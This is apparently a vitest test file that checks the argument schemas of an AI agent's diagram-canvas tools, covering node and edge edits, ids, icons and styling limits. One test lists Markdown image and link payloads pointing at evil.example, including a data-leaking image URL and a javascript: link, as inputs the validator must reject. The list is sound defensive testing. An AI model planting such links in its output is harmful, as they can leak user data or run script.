import { describe, expect, expectTypeOf, it } from 'vitest';
import { ICON_NAMES } from '@/components/IconMap';
import { flowCanvasNodeTypes } from '@/components/flow-canvas/flowCanvasTypes';
import { CLASS_RELATION_TOKENS, ER_RELATION_TOKENS } from '@/lib/relationSemantics';
import type { EdgeData, ErField, NodeData } from '@/lib/types';
import { KNOWN_PROVIDER_PACK_IDS } from '@/services/shapeLibrary/providerCatalog';
import { NODE_COLOR_PALETTE } from '@/theme/palettes';
import {
  AGENT_ICON_PROVIDERS, AGENT_LUCIDE_ICONS, AGENT_MAX_EDIT_OPS, AGENT_MAX_ICON_RESULTS, AGENT_NODE_COLORS, AGENT_NODE_SHAPES,
  AGENT_NODE_TYPES, AGENT_TOOL_NAMES, AGENT_TOOLS, agentToolJsonSchema, type AgentToolName, type EditCanvasOp,
} from './agentTools';

type KnownKeys<T> = { [K in keyof T as string extends K ? never : K]: T[K] };
type AgentNodeData = NonNullable<Extract<EditCanvasOp, { op: 'add_node' }>['data']>;
type AgentEdgeData = NonNullable<Extract<EditCanvasOp, { op: 'add_edge' }>['data']>;

const parse = (name: AgentToolName, args: unknown) => AGENT_TOOLS[name].parameters.safeParse(args).success;
const edit = (...ops: unknown[]) => parse('edit_canvas', { ops });
const addNode = (extra: Record<string, unknown> = {}) => ({ op: 'add_node', id: 'api', type: 'custom', label: 'API', ...extra });

describe('agent tool registry', () => {
  it('describes every tool once with a strict object schema', () => {
    expect(Object.keys(AGENT_TOOLS)).toEqual([...AGENT_TOOL_NAMES]);
    for (const name of AGENT_TOOL_NAMES) {
      expect(AGENT_TOOLS[name].description.length).toBeGreaterThan(40);
      expect(parse(name, { unexpected: true })).toBe(false);
      expect(parse(name, null)).toBe(false);
      expect(parse(name, [])).toBe(false);
    }
  });

  it('offers the agent exactly the Lucide icons the canvas bundles', () => {
    expect([...AGENT_LUCIDE_ICONS].sort()).toEqual([...ICON_NAMES].sort());
  });

  it.each(AGENT_TOOL_NAMES)('exports %s as SDK-ready JSON Schema', (name) => {
    const schema = agentToolJsonSchema(name);
    expect(schema).toMatchObject({ type: 'object', additionalProperties: false });
    expect(JSON.parse(JSON.stringify(schema))).toEqual(schema);
  });

  it('keeps optional arguments out of required and bounds the model-facing schema', () => {
    expect(agentToolJsonSchema('get_canvas').required).toBeUndefined();
    expect(agentToolJsonSchema('find_icons')).toMatchObject({
      required: ['query'],
      properties: { limit: { type: 'integer', minimum: 1, maximum: 10 }, provider: { enum: [...AGENT_ICON_PROVIDERS] } },
    });
    expect(agentToolJsonSchema('layout')).toMatchObject({ required: ['scope'], properties: { scope: { enum: ['new', 'all'] } } });
    expect(agentToolJsonSchema('edit_canvas')).toMatchObject({ required: ['ops'], properties: { ops: { minItems: 1, maxItems: AGENT_MAX_EDIT_OPS } } });
    // Every styling control the properties panel offers costs about 5k tokens of schema.
    expect(JSON.stringify(agentToolJsonSchema('edit_canvas')).length).toBeLessThan(20_000);
  });

  it('matches the app registries it mirrors', () => {
    expect(AGENT_NODE_TYPES.filter((type) => !(type in flowCanvasNodeTypes))).toEqual([]);
    expect([...AGENT_NODE_COLORS].sort()).toEqual(Object.keys(NODE_COLOR_PALETTE).sort());
    expect([...AGENT_ICON_PROVIDERS].sort()).toEqual(Object.keys(KNOWN_PROVIDER_PACK_IDS).sort());
    expectTypeOf<(typeof AGENT_NODE_SHAPES)[number]>().toEqualTypeOf<NonNullable<NodeData['shape']>>();
    // Style words that canvasOps translates; the other fields go into node and edge data as they are.
    type TranslatedNodeField = 'color' | 'fontSize' | 'fontWeight';
    type TranslatedEdgeField = 'color' | 'arrowheads' | 'arrowStyle' | 'path' | 'width' | 'animated' | 'sourceSide' | 'targetSide';
    expectTypeOf<keyof AgentNodeData>().toExtend<keyof KnownKeys<NodeData>>();
    expectTypeOf<Omit<AgentNodeData, 'erFields' | TranslatedNodeField>>().toExtend<Partial<KnownKeys<NodeData>>>();
    expectTypeOf<NonNullable<AgentNodeData['erFields']>[number]>().toExtend<Partial<ErField>>();
    expectTypeOf<Exclude<keyof AgentEdgeData, TranslatedEdgeField>>().toExtend<keyof KnownKeys<EdgeData> | 'seqMessageOrder'>();
    expectTypeOf<Omit<AgentEdgeData, 'seqMessageOrder' | TranslatedEdgeField>>().toExtend<Partial<KnownKeys<EdgeData>>>();
    expect(edit({ op: 'add_edge', source: 'a', target: 'b', data: { classRelation: CLASS_RELATION_TOKENS[0] } })).toBe(true);
    expect(edit({ op: 'add_edge', source: 'a', target: 'b', data: { erRelation: ER_RELATION_TOKENS.at(-1) } })).toBe(true);
  });
});

describe('agent tool arguments', () => {
  it('validates get_canvas', () => {
    expect(parse('get_canvas', {})).toBe(true);
    expect(parse('get_canvas', { detail: 'full', nodeIds: ['a', 'b'] })).toBe(true);
    expect(parse('get_canvas', { detail: 'everything' })).toBe(false);
    expect(parse('get_canvas', { nodeIds: [''] })).toBe(false);
    expect(parse('get_canvas', { nodeIds: Array.from({ length: 501 }, (_, i) => `n${i}`) })).toBe(false);
  });

  it('validates find_icons', () => {
    expect(parse('find_icons', { query: 'lambda' })).toBe(true);
    expect(parse('find_icons', { query: 'cosmos db', provider: 'azure', limit: AGENT_MAX_ICON_RESULTS })).toBe(true);
    for (const args of [{}, { query: '   ' }, { query: 'x'.repeat(201) }, { query: 'db', provider: 'oracle' }, { query: 'db', limit: 0 },
      { query: 'db', limit: 11 }, { query: 'db', limit: 2.5 }, { query: 'db', limit: '5' }]) {
      expect(parse('find_icons', args)).toBe(false);
    }
  });

  it('validates layout, review, and template tools', () => {
    expect(parse('layout', { scope: 'new' })).toBe(true);
    expect(parse('layout', { scope: 'all' })).toBe(true);
    expect(parse('layout', {})).toBe(false);
    expect(parse('layout', { scope: 'selection' })).toBe(false);
    expect(parse('review_architecture', {})).toBe(true);
    expect(parse('list_templates', {})).toBe(true);
    expect(parse('list_templates', { category: 'aws' })).toBe(false);
    expect(parse('use_template', { templateId: 'aws-three-tier' })).toBe(true);
    expect(parse('use_template', {})).toBe(false);
    expect(parse('use_template', { templateId: '' })).toBe(false);
  });

  it('accepts every edit op with its optional fields', () => {
    expect(edit(
      addNode({ parentId: 'vpc', data: { archIconPackId: 'aws-official-starter-v1', archIconShapeId: 'compute-lambda', subLabel: '**Node 22**', color: 'amber', colorMode: 'filled' } }),
      { op: 'add_node', id: 'Order_2', type: 'class', label: 'Order', data: { classStereotype: 'entity', classAttributes: ['+id: string'], classMethods: ['+save(): void'] } },
      { op: 'add_node', id: 'users', type: 'er_entity', label: 'users', data: { erFields: [{ name: 'id', dataType: 'uuid', isPrimaryKey: true }, { name: 'org_id', dataType: 'uuid', isForeignKey: true, referencesTable: 'orgs', referencesField: 'id' }] } },
      { op: 'add_node', id: 'j1', type: 'journey', label: 'Checkout', data: { journeySection: 'Buy', journeyActor: 'Shopper', journeyScore: 5 } },
      { op: 'add_node', id: 'alice', type: 'sequence_participant', label: 'Alice', data: { seqParticipantKind: 'actor' } },
      { op: 'add_node', id: 'q', type: 'decision', label: 'Valid?', data: { shape: 'diamond', icon: 'CircleHelp' } },
      { op: 'update_node', id: 'existing-1', type: 'process', label: 'Renamed', parentId: null, data: { color: 'slate' } },
      { op: 'update_node', id: 'existing-2', parentId: 'vpc' },
      { op: 'remove_node', id: 'old' },
      { op: 'add_edge', source: 'api', target: 'users' },
      { op: 'add_edge', id: 'e-api-db', source: 'api', target: 'users', label: 'SQL', data: { dashPattern: 'dashed' } },
      { op: 'add_edge', source: 'alice', target: 'api', data: { seqMessageKind: 'async', seqMessageOrder: 0 } },
      { op: 'update_edge', id: 'e1', label: '', data: { dashPattern: 'solid' } },
      { op: 'remove_edge', id: 'e2' },
      { op: 'group', id: 'vpc', label: 'VPC', nodeIds: ['api', 'existing-2'] },
      { op: 'add_node', id: 'brand', type: 'process', label: 'Brand', width: 240, height: 90, data: { color: '#4F46E5', fontSize: 16, fontFamily: 'fira', fontWeight: 'bold', fontStyle: 'italic', align: 'left' } },
      { op: 'add_node', id: 'screen', type: 'browser', label: 'app.example.com', data: { variant: 'dashboard', color: 'green' } },
      { op: 'update_node', id: 'existing-3', width: 300, order: 'front' },
      { op: 'add_edge', source: 'api', target: 'users', data: { color: 'red', arrowheads: 'both', arrowStyle: 'open', path: 'rounded', width: 3, dashPattern: 'dotted', animated: true, labelPosition: 0.25, sourceSide: 'right', targetSide: 'auto' } },
      { op: 'update_edge', id: 'e3', reverse: true, data: { color: 'default', path: 'default' } },
      { op: 'update_edge', id: 'e4', source: 'api', target: 'users' },
      { op: 'align', nodeIds: ['api', 'users'], edge: 'middle' },
      { op: 'distribute', nodeIds: ['api', 'users'], axis: 'horizontal', gap: 80 },
    )).toBe(true);
  });

  it('accepts every node type the agent may create and rejects the rest', () => {
    for (const type of AGENT_NODE_TYPES) expect(edit(addNode({ type }))).toBe(true);
    for (const type of ['image', 'mermaid_svg', 'swimlane', 'sequence_note', 'architecture', 'group', 'unknown']) {
      expect(edit(addNode({ type }))).toBe(false);
    }
  });

  it('bounds the batch', () => {
    expect(parse('edit_canvas', {})).toBe(false);
    expect(edit()).toBe(false);
    expect(edit(...Array.from({ length: AGENT_MAX_EDIT_OPS }, (_, i) => addNode({ id: `n${i}` })))).toBe(true);
    expect(edit(...Array.from({ length: AGENT_MAX_EDIT_OPS + 1 }, (_, i) => addNode({ id: `n${i}` })))).toBe(false);
  });

  it('rejects unknown ops, unknown fields, and positions', () => {
    for (const op of [
      { op: 'move_node', id: 'a', x: 1, y: 2 },
      { id: 'a' },
      addNode({ position: { x: 0, y: 0 } }),
      addNode({ data: { width: 400 } }),
      addNode({ data: { customIconUrl: 'https://example.com/icon.svg' } }),
      { op: 'remove_node', id: 'a', cascade: true },
      { op: 'add_edge', source: 'a', target: 'b', data: { elkPoints: [] } },
      { op: 'group', id: 'g', label: 'G', nodeIds: ['a'], data: { color: 'blue' } },
      { op: 'update_edge', id: 'e', reverse: 'yes' },
      { op: 'update_node', id: 'a', order: 'top' },
      { op: 'align', nodeIds: ['a'], edge: 'left' },
      { op: 'align', nodeIds: ['a', 'b'], edge: 'diagonal' },
      { op: 'distribute', nodeIds: ['a', 'b', 'c'] },
    ]) {
      expect(edit(op)).toBe(false);
    }
  });

  it('validates new ids but lets references use existing canvas ids', () => {
    for (const id of ['orders-db', 'db1', 'A_b-2', 'x'.repeat(64)]) expect(edit(addNode({ id }))).toBe(true);
    for (const id of ['', '-lead', 'has space', 'a/b', 'x'.repeat(65), 'node:1', 7]) expect(edit(addNode({ id }))).toBe(false);
    expect(edit({ op: 'add_edge', id: 'bad id', source: 'a', target: 'b' })).toBe(false);
    expect(edit({ op: 'group', id: 'bad id', label: 'G', nodeIds: ['a'] })).toBe(false);
    expect(edit({ op: 'update_node', id: 'node_17 imported:x', label: 'ok' })).toBe(true);
    expect(edit({ op: 'remove_edge', id: 'reactflow__edge-a-b' })).toBe(true);
    expect(edit({ op: 'remove_node', id: 'x'.repeat(201) })).toBe(false);
  });

  it('requires the fields each op needs', () => {
    for (const op of [
      { op: 'add_node', id: 'a', type: 'custom' },
      { op: 'add_node', id: 'a', label: 'A' },
      addNode({ label: '' }),
      { op: 'update_node', label: 'A' },
      { op: 'remove_node' },
      { op: 'add_edge', source: 'a' },
      { op: 'update_edge', label: 'x' },
      { op: 'group', id: 'g', label: 'G', nodeIds: [] },
      { op: 'group', id: 'g', nodeIds: ['a'] },
    ]) {
      expect(edit(op)).toBe(false);
    }
  });

  it('keeps Markdown images and links out of canvas text, which would load or open other sites', () => {
    for (const text of [
      '![](https://evil.example/p?d=secret)', '![logo][ref]', 'See [docs](https://evil.example)', '[x]( <javascript:alert(1)>)',
      '[Docs](//evil.example/x)', '[Docs](&#47;&#47;evil.example)', '[Open runbook][r]\n\n[r]: //evil.example/?c=1',
      '[Open runbook]\n\n> [open runbook]: https://evil.example', '<https://evil.example/x>', 'GET https://evil.example/x',
      'See www.evil.example',
    ]) {
      expect(edit(addNode({ label: text }))).toBe(false);
      expect(edit(addNode({ data: { subLabel: text } }))).toBe(false);
      expect(edit({ op: 'update_node', id: 'a', label: text })).toBe(false);
      expect(edit({ op: 'add_edge', source: 'a', target: 'b', label: text })).toBe(false);
      expect(edit({ op: 'update_edge', id: 'e', label: text })).toBe(false);
      expect(edit({ op: 'group', id: 'g', label: text, nodeIds: ['a'] })).toBe(false);
    }
    for (const text of ['Orders [v2]', 'Retry (3x)', 'GET api.example.com/orders', 'Done!', '**Node 22** `pg`', 'a < b: yes']) {
      expect(edit(addNode({ label: text, data: { subLabel: text } }))).toBe(true);
      expect(edit({ op: 'add_edge', source: 'a', target: 'b', label: text })).toBe(true);
    }
  });

  it('restricts node and edge data values', () => {
    for (const data of [
      { color: 'custom' }, { color: '#ff00' }, { color: 'ff0000' }, { color: 'teal' }, { colorMode: 'outline' },
      { fontSize: 4 }, { fontSize: 13.5 }, { fontSize: '13' }, { fontFamily: 'comic' }, { fontWeight: '700' }, { align: 'justify' }, { shape: 'star' }, { icon: '' }, { icon: 'x'.repeat(65) },
      { journeyScore: 0 }, { journeyScore: 6 }, { journeyScore: 3.5 }, { seqParticipantKind: 'boundary' },
      { erFields: ['id uuid'] }, { erFields: [{ name: 'id' }] }, { erFields: [{ name: 'id', dataType: 'uuid', isPrimaryKey: 'yes' }] },
      { erFields: [{ name: 'id', dataType: 'uuid', comment: 'x' }] }, { classAttributes: 'id' },
      { classAttributes: Array.from({ length: 101 }, () => 'x') }, { subLabel: 'x'.repeat(2_001) },
    ]) {
      expect(edit(addNode({ data }))).toBe(false);
    }
    for (const data of [
      { dashPattern: 'wavy' }, { color: 'custom' }, { color: '#12345' }, { arrowheads: 'left' }, { arrowStyle: 'diamond' },
      { path: 'zigzag' }, { width: 0 }, { width: 7 }, { labelPosition: 1.5 }, { sourceSide: 'north' }, { animated: 'yes' },
      { classRelation: '->' }, { erRelation: '1--1' }, { seqMessageKind: 'call' },
      { seqMessageOrder: -1 }, { seqMessageOrder: 1.5 },
    ]) {
      expect(edit({ op: 'add_edge', source: 'a', target: 'b', data })).toBe(false);
    }
  });
});
